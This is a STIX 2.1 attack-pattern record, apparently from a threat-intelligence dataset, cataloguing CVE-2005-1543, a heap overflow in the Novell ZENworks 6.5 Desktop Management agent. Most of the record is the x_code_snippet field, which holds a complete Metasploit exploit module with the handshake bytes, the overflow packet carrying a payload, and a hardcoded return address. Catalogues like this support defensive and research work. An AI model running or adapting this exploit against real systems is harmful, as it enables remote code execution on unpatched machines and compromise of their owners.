{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6208fd6-e3fd-474d-9fb6-fbffc9c95d15",
    "created": "2024-08-14T16:38:49.965416Z",
    "modified": "2024-08-14T16:38:49.96542Z",
    "name": "Novell ZENworks 6.5 Desktop/Server Management Overflow",
    "description": " This module exploits a heap overflow in the Novell ZENworks Desktop Management agent. This vulnerability was discovered by Alex Wheeler. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/novell/zenworks_desktop_agent.rb",
            "external_id": "zenworks_desktop_agent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1543"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell ZENworks 6.5 Desktop/Server Management Overflow',\n      'Description'    => %q{\n          This module exploits a heap overflow in the Novell ZENworks\n        Desktop Management agent. This vulnerability was discovered\n        by Alex Wheeler.\n      },\n      'Author'         => [ 'Unknown' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-1543'],\n          [ 'OSVDB', '16698'],\n          [ 'BID', '13678'],\n\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 32767,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'      => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Windows XP/2000/2003- ZENworks 6.5 Desktop/Server Agent',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x10002e06,\n            },\n          ],\n        ],\n      'DisclosureDate' => '2005-05-19',\n      'DefaultTarget' => 0))\n  end\n\n  def exploit\n    connect\n\n    hello = \"\\x00\\x06\\x05\\x01\\x10\\xe6\\x01\\x00\\x34\\x5a\\xf4\\x77\\x80\\x95\\xf8\\x77\"\n    print_status(\"Sending version identification\")\n    sock.put(hello)\n\n    pad   = Rex::Text.rand_text_alphanumeric(6, payload_badchars)\n    ident = sock.get_once\n    if !(ident and ident.length == 16)\n      print_error(\"Failed to receive agent version identification\")\n      return\n    end\n\n    print_status(\"Received agent version identification\")\n    print_status(\"Sending client acknowledgement\")\n    sock.put(\"\\x00\\x01\")\n\n    # Stack buffer overflow in ZenRem32.exe / ZENworks Server Management\n    sock.put(\"\\x00\\x06#{pad}\\x00\\x06#{pad}\\x7f\\xff\" + payload.encoded + \"\\x00\\x01\")\n\n    ack = sock.get_once\n    sock.put(\"\\x00\\x01\")\n    sock.put(\"\\x00\\x02\")\n\n    print_status(\"Sending final payload\")\n    sock.put(\"\\x00\\x24\" + (\"A\" * 0x20) + [ target.ret ].pack('V'))\n\n    print_status(\"Overflow request sent, sleeping for four seconds\")\n    select(nil,nil,nil,4)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-05-19",
    "x_mitre_platforms": [
        "win'"
    ]
}